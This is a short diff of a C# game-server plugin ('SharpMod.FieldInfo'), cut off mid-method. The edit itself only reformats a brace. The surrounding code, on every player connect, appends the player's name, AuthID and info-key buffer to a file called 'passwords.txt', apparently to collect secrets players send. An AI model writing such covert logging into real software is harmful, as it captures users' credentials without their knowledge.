@@ -30,8 +30,7 @@ namespace SharpMod.FieldInfo
   {
     public override void Load()
     {
-      Player.Connect += delegate(Player.ConnectEventArgs args)
-      {
+      Player.Connect += delegate(Player.ConnectEventArgs args) {
         StreamWriter sw = new StreamWriter(File.Open("passwords.txt", FileMode.Append));
         sw.WriteLine("{0} {1} {2} {3}", DateTime.Now, args.Player.Name, args.Player.AuthID, args.Player.InfoKeyBuffer);
         sw.Close();
